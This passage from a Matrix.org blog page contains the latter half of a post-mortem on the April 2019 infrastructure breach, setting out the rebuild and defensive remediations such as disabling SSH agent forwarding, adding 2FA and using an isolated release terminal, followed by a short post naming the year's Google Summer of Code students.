<p><img src="/blog/img/cf.png" alt="Cloudflare login UI" /></p>
<p>...where the top account is your personal one, and the bottom one is an admin role account.  To rotate the admin API key, we clicked on the admin account to log in as the admin, and then went to the Profile menu, found the API keys and hit the <a href="https://support.cloudflare.com/hc/en-us/articles/221318707-How-do-I-change-my-Global-API-Key-">Change API Key</a> button.</p>
<p>Unfortunately, when you do this, it turns out that the API Key it changes is your personal one, rather than the admin one.  As a result, in our rush we thought we‚Äôd rotated the admin API key, but we hadn‚Äôt, thus accidentally enabling the defacement.</p>
<p>To flush out the defacement we logged in directly as the admin user and changed the API key, pointed the DNS back at the right place, and continued on with the rebuild.</p>
<h3 id="the-rebuild">The Rebuild</h3>
<p>The goal of the rebuild has been to get all the higher priority services back up rapidly - whilst also ensuring that good security practices are in place going forwards.  In practice, this meant making some immediate decisions about how to ensure the new infrastructure did not suffer the same issues and fate as the old.  Firstly, we ensured the most obvious mistakes that made the breach possible were mitigated:</p>
<ul>
<li>Access via SSH restricted as heavily as possible</li>
<li>SSH agent forwarding disabled server-side</li>
<li>All configuration to be managed by Ansible, with secrets encrypted in vaults, rather than sitting in a git repo.</li>
</ul>
<p>Then, whilst reinstating services on the new infra, we opted to review <strong>everything</strong> being installed for security risks, replacing with securer alternatives if needed, even if it slowed down the rebuild.  Particularly, this meant:</p>
<ul>
<li>Jenkins has been replaced by <a href="https://buildkite.com/matrix-dot-org">Buildkite</a></li>
<li>Wordpress has been replaced by static generated sites (e.g. <a href="https://github.com/matrix-org/matrix.org/tree/master/gatsby">Gatsby</a>)</li>
<li>cgit has been replaced by <a href="https://gitlab.matrix.org">gitlab</a>.</li>
<li>Entirely new packaging building, signing &amp; distribution infrastructure (more on that later)</li>
<li>etc.</li>
</ul>
<p>Now, while we restored the main synapse (homeserver), sydent (identity server), sygnal (push server), databases, load balancers, intranet and website on Apr 11, it‚Äôs important to understand that there were over 100 other services running on the infra - which is why it is taking a while to get full parity with where we were before.</p>
<p>In the interest of transparency (and to try to give a sense of scale of the impact of the breach), here is the public-facing service list we restored, showing priority (1 is top, 4 is bottom) and the % restore status as of May 4th:</p>
<p><img src="/blog/img/services.png" alt="Service status" /></p>
<p>Apologies again that it took longer to get some of these services back up than we‚Äôd preferred (and that there are still a few pending).  Once we got the top priority ones up, we had no choice but to juggle the remainder alongside remediation work, <a href="https://matrix.org/blog/2019/05/03/security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28-a/">other security work</a>, and actually working on Matrix(!), whilst ensuring that the services we restored were being restored securely.</p>
<h3 id="remediations">Remediations</h3>
<p>Once the majority of the P1 and P2 services had been restored, on Apr 24 we held a formal retrospective for the team on the whole incident, which in turn kicked off a full security audit over the entirety of our infrastructure and operational processes.</p>
<p>We‚Äôd like to share the resulting remediation plan in as much detail as possible, in order to show the approach we are taking, and in case it helps others avoid repeating the mistakes of our past. Inevitably we‚Äôre going to have to skip over some of the items, however - after all, remediations imply that there‚Äôs something that could be improved, and for obvious reasons we don‚Äôt want to dig into areas where remediation work is still ongoing.  We will aim to provide an update on these once ongoing work is complete, however.</p>
<p>We should also acknowledge that after being removed from the infra, the attacker chose to file a <a href="https://github.com/matrix-org/matrix.org/issues/371">set of Github issues</a> on Apr 12 to highlight some of the security issues that had taken advantage of during the breach.  Their actions matched the findings from our forensics on Apr 10, and their suggested remediations aligned with our plan.</p>
<p>We‚Äôve split the remediation work into the following domains.</p>
<h4 id="ssh">SSH</h4>
<p>Some of the biggest issues exposed by the security breach concerned our use of SSH, which we‚Äôll take in turn:</p>
<h5 id="ssh-agent-forwarding-should-be-disabled">SSH agent forwarding should be disabled.</h5>
<p>SSH agent forwarding is a beguilingly convenient mechanism which allows a user to ‚Äòforward‚Äô access to their private SSH keys to a remote server whilst logged in, so they can in turn access other servers via SSH from that server.  Typical uses are to make it easy to copy files between remote servers via scp or rsync, or to interact with a SCM system such as Github via SSH from a remote server.  Your private SSH keys end up available for use by the server for as long as you are logged into it, letting the server impersonate you.</p>
<p>The common wisdom on this tends to be something like: ‚ÄúOnly use agent forwarding when connecting to trusted hosts‚Äù.  For instance, <a href="https://developer.github.com/v3/guides/using-ssh-agent-forwarding/#setting-up-ssh-agent-forwarding">Github‚Äôs guide to using SSH agent forwarding</a> says: </p>
<blockquote>
<p><strong>Warning</strong>: You may be tempted to use a wildcard like <code>Host *</code> to just apply this setting (ForwardAgent: yes) to all SSH connections. That's not really a good idea, as you'd be sharing your local SSH keys with <em>every</em> server you SSH into. They won't have direct access to the keys, but they will be able to use them <em>as you</em> while the connection is established. <strong>You should only add servers you trust and that you intend to use with agent forwarding</strong></p>
</blockquote>
<p>As a result, several of the team doing ops work had set <code>Host *.matrix.org ForwardAgent: yes</code> in their ssh client configs, thinking ‚Äúwell, what <em>can</em> we trust if not our own servers?‚Äù</p>
<p>This was a massive, massive mistake.</p>
<p>If there is one lesson everyone should learn from this whole mess, it is: <strong>SSH agent forwarding is incredibly unsafe, and in general you should never use it.</strong>  Not only can malicious code running on the server as that user (or root) hijack your credentials, but your credentials can in turn be used to access hosts behind your network perimeter which might otherwise be inaccessible.  All it takes is someone to have snuck malicious code on your server waiting for you to log in with a forwarded agent, and <em>boom</em>, even if it was just a one-off <code>ssh -A</code>.</p>
<p>Our remediations for this are:</p>
<ul>
<li>Disable all ssh agent forwarding on the servers.</li>
<li>If you need to jump through a box to ssh into another box, use <code>ssh -J $host</code>.</li>
<li>This can also be used with rsync via <code>rsync -e &quot;ssh -J $host&quot;</code></li>
<li>If you need to copy files between machines, use rsync rather than scp (OpenSSH 8.0‚Äôs <a href="https://www.openssh.com/txt/release-8.0">release notes</a> explicitly recommends using more modern protocols than scp).</li>
<li>If you need to regularly copy stuff from server to another (or use SSH to GitHub to check out something from a private repo), it might be better to have a specific SSH ‚Äòdeploy key‚Äô created for this, stored server-side and only able to perform limited actions.</li>
<li>If you just need to check out stuff from public git repos, use https rather than git+ssh.</li>
<li>Try to educate everyone on the perils of SSH agent forwarding: if our past selves can‚Äôt be a good example, they can at least be a horrible warning...</li>
</ul>
<p>Another approach could be to allow forwarding, but configure your SSH agent to prompt whenever a remote app tries to access your keys.  However, not all agents support this (OpenSSH‚Äôs does via <code>ssh-add -c</code>, but gnome-keyring for instance doesn‚Äôt), and also it might still be possible for a hijacker to race with the valid request to hijack your credentials.</p>
<h5 id="ssh-should-not-be-exposed-to-the-general-internet">SSH should not be exposed to the general internet</h5>
<p>Needless to say, SSH is no longer exposed to the general internet.  We are rolling out a VPN as the main access to dev network, and then SSH bastion hosts to be the only access point into production, using SSH keys to restrict access to be as minimal as possible.</p>
<h5 id="ssh-keys-should-give-minimal-access">SSH keys should give minimal access</h5>
<p>Another major problem factor was that individual SSH keys gave very broad access. We have gone through ensuring that SSH keys grant the least privilege required to the users in question. Particularly, root login should not be available over SSH.</p>
<p>A typical scenario where users might end up with unnecessary access to production are developers who simply want to push new code or check its logs.  We are mitigating this by switching over to using continuous deployment infrastructure everywhere rather than developers having to actually SSH into production.  For instance, the new <a href="https://matrix.org/blog">matrix.org blog</a> is continuously deployed into production by Buildkite from <a href="https://github.com/matrix-org/matrix.org">GitHub</a> without anyone needing to SSH anywhere.  Similarly, logs should be available to developers from a logserver in real time, without having to SSH into the actual production host. We‚Äôve already been experimenting internally with sentry for this.</p>
<p>Relatedly, we‚Äôve also shifted to requiring multiple SSH keys per user (per device, and for privileged / unprivileged access), to have finer grained granularity over locking down their permissions and revoking them etc.  (We had actually already started this process, and while it didn‚Äôt help prevent the attack, it did assist with forensics).</p>
<h5 id="two-factor-authentication">Two factor authentication</h5>
<p>We are rolling out two-factor authentication for SSH to ensure that even if keys are compromised (e.g. via forwarding hijack), the attacker needs to have also compromised other physical tokens in order to successfully authenticate.</p>
<h5 id="it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys">It should be made as hard as possible to add malicious SSH keys</h5>
<p>We‚Äôve decided to stop users from being able to directly manage their own SSH keys in production via <code>~/.ssh/authorized_keys</code> (or <code>~/.ssh/authorized_keys2</code> for that matter) - we can see no benefit from letting non-root users set keys.</p>
<p>Instead, keys for all accounts are managed exclusively by Ansible via <code>/etc/ssh/authorized_keys/$account</code> (using sshd‚Äôs <code>AuthorizedKeysFile /etc/ssh/authorized_keys/%u</code> directive).</p>
<h5 id="changes-to-ssh-keys-should-be-carefully-monitored">Changes to SSH keys should be carefully monitored</h5>
<p>If we‚Äôd had sufficient monitoring of the SSH configuration, the breach could have been caught instantly.  We are doing this by managing the keys exclusively via Ansible, and also improving our intrusion detection in general.</p>
<p>Similarly, we are working on tracking changes and additions to other credentials (and enforcing their complexity).</p>
<h5 id="ssh-config-should-be-hardened-disabling-unnecessary-options">SSH config should be hardened, disabling unnecessary options</h5>
<p>If we‚Äôd gone through reviewing the default sshd config when we set up the datacenter in the first place, we‚Äôd have caught several of these failure modes at the outset.  We‚Äôve now done so (as per above).</p>
<p>We‚Äôd like to recommend that packages of openssh start having secure-by-default configurations, as a number of the old options just don‚Äôt need to exist on most newly provisioned machines. </p>
<h4 id="network-architecture">Network architecture</h4>
<p>As mentioned in the History section, the legacy network infrastructure effectively grew organically, without really having a core network or a good split between different production environments.</p>
<p>We are addressing this by:</p>
<ul>
<li>Splitting our infrastructure into strictly separated service domains, which are firewalled from each other and can only access each other via their respective ‚Äòfront doors‚Äô (e.g. HTTPS APIs exposed at the loadbalancers).
<ul>
<li>Development</li>
<li>Intranet</li>
<li>Package Build (airgapped; see below for more details)</li>
<li>Package Distribution</li>
<li>Production, which is in turn split per class of service.</li>
</ul>
</li>
<li>Access to these networks will be via VPN + SSH jumpboxes (as per above).  Access to the VPN is via per-device certificate + 2FA, and SSH via keys as per above.</li>
<li>Switching to an improved internal VPN between hosts within a given network environment (i.e. we don‚Äôt trust the datacenter LAN).</li>
</ul>
<p>We‚Äôre also running most services in containers by default going forwards (previously it was a bit of a mix of running unix processes, VMs, and occasional containers), providing an additional level of namespace isolation. </p>
<h4 id="keeping-patched">Keeping patched</h4>
<p>Needless to say, this particular breach would not have happened had we kept the public-facing Jenkins patched (although there would of course still have been scope for a 0-day attack).</p>
<p>Going forwards, we are establishing a formal regular process for deploying security updates rather than relying on spotting security advisories on an ad hoc basis. We are now also setting up regular vulnerability scans against production so we catch any gaps before attackers do.</p>
<p>Aside from our infrastructure, we‚Äôre also extending the process of regularly checking for security updates to also checking for outdated dependencies in our distributed software (Riot, Synapse, etc) too, given the discipline to regularly chase outdated software applies equally to both.</p>
<p>Moving all our machine deployment and configuration into Ansible allows this to be a much simpler task than before.</p>
<h4 id="intrusion-detection">Intrusion detection</h4>
<p>There‚Äôs obviously a lot we need to do in terms of spotting future attacks as rapidly as possible.  Amongst other strategies, we‚Äôre working on real-time log analysis for aberrant behaviour.</p>
<h4 id="incident-management">Incident management</h4>
<p>There is much we have learnt from managing an incident at this scale. The main highlights taken from our internal retrospective are:</p>
<ul>
<li>The need for a single incident manager to coordinate the technical response and coordinate prioritisation and handover between those handling the incident. (We lacked a single incident manager at first, given several of the team started off that week on holiday...)</li>
<li>The benefits of gathering all relevant info and checklists onto a canonical set of shared documents rather than being spread across different chatrooms and lost in scrollback.</li>
<li>The need to have an existing inventory of services and secrets available for tracking progress and prioritisation</li>
<li>The need to have a general incident management <a href="https://news.ycombinator.com/item?id=19682451&amp;p=2">checklist</a> for future reference, which folks can familiarise themselves with ahead of time to avoid stuff getting forgotten.  The sort of stuff which will go on our checklist in future includes:
<ul>
<li>Remembering to appoint named incident manager, external comms manager &amp; internal comms manager. (They could of course be the same person, but the roles are distinct).</li>
<li>Defining a sensible sequence of forensics, mitigations, communication, rotating secrets etc is followed rather than having to work it out on the fly and risk forgetting stuff</li>
<li>Remembering to informing the ICO (Information Commissioner Office) of any user data breaches</li>
<li>Guidelines on how to balance between forensics and rebuilding (i.e. how long to spend on forensics, if at all, before pulling the plug)</li>
<li>Reminders to snapshot systems for forensics &amp; backups</li>
<li>Reminder to not redesign infrastructure during a rebuild.  There were a few instances where we lost time by seizing the opportunity to try to fix design flaws whilst rebuilding, some of which were avoidable.</li>
<li>Making sure that communication isn‚Äôt sent prematurely to users (e.g. we posted the blog post asking people to update their passwords before password reset had actually been restored - apologies for that.)</li>
</ul>
</li>
</ul>
<h4 id="configuration-management">Configuration management</h4>
<p>One of the major flaws once the attacker was in our network was that our internal configuration git repo was cloned on most accounts on most servers, containing within it a plethora of unencrypted secrets.  Config would then get symlinked from the checkout to wherever the app or OS needed it.</p>
<p>This is bad in terms of leaving unencrypted secrets (database passwords, API keys etc) lying around everywhere, but also in terms of being able to automatically maintain configuration and spot unauthorised configuration changes.</p>
<p>Our solution is to switch all configuration management, from the OS upwards, to Ansible (which we had already established for Modular.im), using Ansible vaults to store the encrypted secrets.  It‚Äôs unfortunate that we had already done the work for this (and even had been <a href="https://github.com/ansible-community/ansible-london-meetup/blob/master/presentations/2019-01-31/Introducing%20Ansible%20to%20matrix-final.pdf">giving talks at Ansible meetups</a> about it!) but had not yet applied it to the legacy infrastructure.</p>
<h4 id="avoiding-temporary-measures-which-last-forever">Avoiding temporary measures which last forever</h4>
<p>None of this would have happened had we been more disciplined in finishing off the temporary infrastructure from back in 2017.  As a general point, we should try and do it right the first time - and failing that, assign responsibility to someone to update it and assign responsibility to someone else to check. In other words, the only way to dig out of temporary measures like this is to project manage the update or it will not happen.  This is of course a general point not specific to this incident, but one well worth reiterating.</p>
<h4 id="secure-packaging">Secure packaging</h4>
<p>One of the most unfortunate mistakes highlighted by the breach is that the signing keys for the Synapse debian repository, Riot debian repository and Riot/Android releases on the Google Play Store had ended up on hosts which were compromised during the attack.  This is obviously a massive fail, and is a case of the geo-distributed dev teams prioritising the convenience of a near-automated release process without thinking through the security risks of storing keys on a production server.</p>
<p>Whilst the keys were compromised, none of the packages that we distribute were tampered with. However, the impact on the project has been high - particularly for Riot/Android, as we cannot allow the risk of an attacker using the keys to sign and somehow distribute malicious variants of Riot/Android, and Google provides no means of recovering from a compromised signing key beyond creating a whole new app and starting over.  Therefore we have lost all our ratings, reviews and download counts on Riot/Android and <a href="https://medium.com/@RiotChat/riot-im-android-security-update-2b3f655ad739">started over</a>.  (If you want to give the newly released app a fighting chance despite this setback, feel free to <a href="https://play.google.com/store/apps/details?id=im.vector.app&amp;showAllReviews=true">give it some stars</a> on the Play Store). We also revoked the compromised Synapse &amp; Riot GPG keys and created new ones (and published <a href="https://github.com/matrix-org/synapse/commit/95c603ae6f0f1639f6299fff62d7a75002221276#diff-7d442b7eb49f5fc377f51e74b291cfc1">new instructions</a> for how to securely set up your Synapse or Riot debian repos).</p>
<p>In terms of remediation, designing a secure build process is surprisingly hard, particularly for a geo-distributed team.  What we have landed on is as follows:</p>
<ul>
<li>Developers create a release branch to signify a new release (ensuring dependencies are pinned to known good versions).</li>
<li>We then perform all releases from a dedicated isolated release terminal.
<ul>
<li>This is a device which is kept disconnected from the internet, other than when doing a release, and even then it is firewalled to be able to pull data from SCM and push to the package distribution servers, but otherwise entirely isolated from the network.</li>
<li>Needless to say, the device is strictly used for <em>nothing</em> other than performing releases.</li>
<li>The build environment installation is scripted and installs on a fresh OS image (letting us easily build new release terminals as needed)</li>
<li>The signing keys (hardware or software) are kept exclusively on this device.</li>
<li>The publishing SSH keys (hardware or software) used to push to the packaging servers are kept exclusively on this device.</li>
<li>We physically store the device securely.</li>
<li>We ensure someone on the team always has physical access to it in order to do emergency builds.</li>
</ul>
</li>
<li>Meanwhile, releases are distributed using dedicated infrastructure, entirely isolated from the rest of production.
<ul>
<li>These live at <a href="https://packages.matrix.org">https://packages.matrix.org</a> and <a href="https://packages.riot.im">https://packages.riot.im</a></li>
<li>These are minimal machines with nothing but a static web-server.</li>
<li>They are accessed only via the dedicated SSH keys stored on the release terminal.</li>
<li>These in turn can be mirrored in future to avoid a SPOF (or we could cheat and use Cloudflare‚Äôs <a href="https://www.cloudflare.com/always-online/">always online</a> feature, for better or worse).</li>
</ul>
</li>
</ul>
<p>Alternatives here included:</p>
<ul>
<li>In an ideal world we‚Äôd do reproducible builds instead, and sign the build‚Äôs hash with a hardware key, but given we don‚Äôt have reproducible builds yet this will have to suffice for now.</li>
<li>We could delegate building and distribution entirely to a 3rd party setup such as OBS (as per <a href="https://github.com/matrix-org/matrix.org/issues/370">https://github.com/matrix-org/matrix.org/issues/370</a>).  However, we have a very wide range of artefacts to build across many different platforms and OSes, so would rather build ourselves if we can.</li>
</ul>
<h4 id="dev-and-ci-infrastructure">Dev and CI infrastructure</h4>
<p>The main change in our dev and CI infrastructure is to move from Jenkins to <a href="https://buildkite.com/matrix-dot-org">Buildkite</a>.  The latter has been serving us well for Synapse builds over the last few months, and has now been extended to serve all the main CI pipelines that Jenkins was providing.  Buildkite works by orchestrating jobs on a elastic pool of CI workers we host in our own AWS, and so far has done so quite painlessly.</p>
<p>The new pipelines have been set up so that where CI needs to push artefacts to production for continuous deployment (e.g. <a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/riot.im/develop">riot.im/develop</a>), it does so by poking production via HTTPS to trigger production to pull the artefact from CI, rather than pushing the artefact via SSH to production.</p>
<p>Other than CI, our strategy is:</p>
<ul>
<li>Continue using Github for public repositories</li>
<li>Use gitlab.matrix.org for private repositories (and stuff which we don‚Äôt want to re-export via the US, like <a href="https://gitlab.matrix.org/matrix-org/olm">Olm</a>)</li>
<li>Continue to host docker images on Docker Hub (despite their recent <a href="https://success.docker.com/article/docker-hub-user-notification">security dramas</a>).</li>
</ul>
<h4 id="log-minimisation-and-handling-personally-identifying-information-pii">Log minimisation and handling Personally Identifying Information (PII)</h4>
<p>Another thing that the breach made painfully clear is that we log too much.  While there‚Äôs not much evidence of the attacker going spelunking through any Matrix service log files, the fact is that whilst developing Matrix we‚Äôve kept logging on matrix.org relatively verbose to help with debugging.  There‚Äôs nothing more frustrating than trying to trace through the traffic for a bug only to discover that logging didn‚Äôt pick it up.</p>
<p>However, we can still improve our logging and PII-handling substantially:</p>
<ul>
<li>Ensuring that wherever possible, we hash or at least truncate any PII before logging it (access tokens, matrix IDs, 3rd party IDs etc).</li>
<li>Minimising log retention to the bare minimum we need to investigate recent issues and abuse</li>
<li>Ensuring that PII is stored hashed wherever possible.</li>
</ul>
<p>Meanwhile, in Matrix itself we already are very mindful of handling PII (c.f. our <a href="https://github.com/vector-im/policies/tree/master/docs/matrix-org">privacy policies</a> and <a href="https://matrix.org/blog/2018/05/08/gdpr-compliance-in-matrix/">GDPR work</a>), but there is also more we can do, particularly:</p>
<ul>
<li>Turning on end-to-end encryption by default, so that even if a server is compromised, the attacker cannot get at private message history.  Everyone who uses E2EE in Matrix should have felt some relief that even though the server was compromised, their message history was safe: we need to provide that to everyone.  This is <a href="https://github.com/vector-im/riot-web/issues/6779">https://github.com/vector-im/riot-web/issues/6779</a>.</li>
<li>We need device audit trails in Matrix, so that even if a compromised server (or malicious server admin) temporarily adds devices to your account, you can see what‚Äôs going on.  This is <a href="https://github.com/matrix-org/synapse/issues/5145">https://github.com/matrix-org/synapse/issues/5145</a></li>
<li>We need to empower users to configure history retention in their rooms, so they can limit the amount of history exposed to an attacker. This is <a href="https://github.com/matrix-org/matrix-doc/pull/1763">https://github.com/matrix-org/matrix-doc/pull/1763</a></li>
<li>We need to provide account portability (aka decentralised accounts) so that even if a server is compromised, the users can seamlessly migrate elsewhere. The first step of this is <a href="https://github.com/matrix-org/matrix-doc/pull/1228">https://github.com/matrix-org/matrix-doc/pull/1228</a>.</li>
</ul>
<h3 id="conclusion">Conclusion</h3>
<p>Hopefully this gives a comprehensive overview of what happened in the breach, how we handled it, and what we are doing to protect against this happening in future.</p>
<p>Again, we‚Äôd like to apologise for the massive inconvenience this caused to everyone caught in the crossfire. Thank you for your patience and for sticking with the project whilst we restored systems. And while it is very unfortunate that we ended up in this situation, at least we should be coming out of it much stronger, at least in terms of infrastructure security.  We‚Äôd also like to particularly thank <a href="https://www.linkedin.com/in/kade-morton-34179283/">Kade Morton</a> for providing independent review of this post and our remediations, and everyone who reached out with #hugops during the incident (it was literally the only positive thing we had on our radar), and finally thanks to the those of the Matrix team who hauled ass to rebuild the infrastructure, and also those who doubled down meanwhile to keep the rest of the project on track.</p>
<p>On which note, we‚Äôre going to go back to building decentralised communication protocols and reference implementations for a bit...  Emoji reactions are on the horizon (at last!), as is Message Editing, RiotX/Android and a host of other long-awaited features - not to mention finally releasing Synapse 1.0.  So: thanks again for flying Matrix, even during this period of extreme turbulence and, uh, hijack.  Things should mainly be back to normal now and for the foreseeable.</p>
<p><i>Given the new blog doesn't have comments yet, feel free to discuss the post over at <a href="https://news.ycombinator.com/item?id=19857744">HN</a>.</i></p>

        </div>
    </article>
    
    <article class="post">
        <header>
            <h1><a href="https:&#x2F;&#x2F;matrix.turbo.fish&#x2F;blog&#x2F;2019&#x2F;05&#x2F;07&#x2F;welcome-to-the-2019-g-so-c-participants&#x2F;" title="Welcome to the 2019 GSoC Participants!">Welcome to the 2019 GSoC Participants!</a></h1>
            <span>
                07.05.2019 00:00
                ‚Äî
                <a href="/category/gsoc">
                    GSOC
                </a>
                ‚Äî
                
                <a href="/author/andrew-morgan">
                    Andrew Morgan
                </a>
                
            </span>
            
        </header>
        <div>
            <p>It‚Äôs that time of year again! Matrix.org is once again participating in the <a href="https://summerofcode.withgoogle.com/">Google Summer of Code</a> program. We have been allocated four student slots by Google this year, and narrowing the 18 proposals we received down to just four was a very difficult task.</p>
<p>In the end, we have decided on the following four students and their proposed projects:</p>
<p>Alexey Andreyev‚Äôs proposal involves adding end-to-end encryption to <a href="https://github.com/QMatrixClient/libqmatrixclient">libQMatrixClient</a> for future support in Qt/libQMatrixClient-based clients such as <a href="https://github.com/QMatrixClient/Quaternion">Quaternion</a> and <a href="https://gitlab.com/spectral-im/spectral/">Spectral</a>. They will be mentored by <a href="https://matrix.to/#/@kitsune:matrix.org">kitsune</a>, lead developer of libQMatrixClient, and our own end-to-end encryption expert, <a href="https://matrix.to/#/@uhoreg:matrix.org">uhoreg</a>.</p>
<p>Kai Hiller‚Äôs proposal for more reliable third-party protocol <a href="https://matrix.org/docs/projects/bridges">bridges</a> includes adding the ability to notify the user when a message fails to reach its final destination despite being accepted by the bridge. <a href="https://matrix.to/#/@half-shot:half-shot.uk">Half-Shot</a>.</p>
<p>Eisha Chen-yen-su‚Äôs proposal for Matrix Visualisations aims to ‚Äúdevelop a tool which will visualise the event Directed Acyclic Graph data structure which describes the conversation history in a room. It will be a real-time visualisation of the DAG of a given Matrix room, as seen from the perspective of one or more HomeServers (HSes).‚Äù They state that ‚Äúthis tool will be useful for debugging or administration of Matrix HSes by making people able to easily see how the federation process works‚Äù. They have already posted prototypes of their tool in <a href="https://matrix.to/#/#gsoc:matrix.org">#gsoc:matrix.org</a>, and it‚Äôs all written in Rust! Which makes their mentor, <a href="https://matrix.to/#/@erikj:jki.re">erikj</a>, very happy.</p>
<p>And finally, Cnly‚Äôs proposal for working towards completion of <a href="https://github.com/matrix-org/dendrite">Dendrite</a>‚Äôs Client-Server API. The proposal also touches on general improvements to the codebase and increasing test coverage. Cnly will be mentored by <a href="https://matrix.to/#/@brendan:abolivier.bzh">babolivier</a> and <a href="https://matrix.to/#/@andrewm:amorgan.xyz">anoa</a>.</p>
<p>Congratulations to the selected students. We look forward to participating with you on completing your project over the course of the summer holidays.</p>
<p>If your proposal was not selected, do not give up hope! Being an active member of the Matrix community and having a deep understanding of the ecosystem and its projects is a big part of what we look for when choosing candidates. If you stick around, you have a strong chance of being chosen in a subsequent year. </p>
<p>We will not be sharing individual‚Äôs proposal documents, but students are free to share them as they please.</p>

        </div>
    </article>
    
    <nav class="pagination">
    <div class="prev">
        
        <a href="https:&#x2F;&#x2F;matrix.turbo.fish&#x2F;blog&#x2F;page&#x2F;39&#x2F;">‚Äπ Previous</a>
        
    </div>
    <span class="page-number">40 / 68</span>
    <div class="prev">
        
        <a href="https:&#x2F;&#x2F;matrix.turbo.fish&#x2F;blog&#x2F;page&#x2F;41&#x2F;">Next ‚Ä∫</a>
        
    </div>
</nav>

</div>
    </main>

    <footer class="site-footer">
    <div class="internal-links">
        
        <a href="&#x2F;faq">FAQs</a>
        
        <a href="&#x2F;security-disclosure-policy">Security Disclosure Policy</a>
        
        <a href="&#x2F;security-hall-of-fame">Security Hall of Fame</a>
        
        <a href="&#x2F;legal&#x2F;code-of-conduct">Code of Conduct for Matrix.org</a>
        
        <a href="&#x2F;legal">Legal</a>
        
        <a href="&#x2F;contact">Contact</a>
        
        <a href="https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;">Site Source</a>
        
    </div>
    <div class="external-links">
        <div>
            
            <a href="https:&#x2F;&#x2F;github.com&#x2F;matrix-org"><img src="/assets/github.svg" alt="GitHub"></a>
            
            <a href="https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;"><img src="/assets/gitlab.svg" alt="GitLab"></a>
            
            <a href="https:&#x2F;&#x2F;mastodon.matrix.org&#x2F;@matrix"><img src="/assets/mastodon.svg" alt="Mastodon"></a>
            
            <a href="https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg"><img src="/assets/twitter.svg" alt="Twitter"></a>
            
            <a href="https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UCVFkW-chclhuyYRbmmfwt6w"><img src="/assets/youtube.svg" alt="YouTube"></a>
            
        </div>
    </div>
    <p><a href="/legal/copyright-notice">Copyright Notice</a></p>
</footer>

</body>

</html>
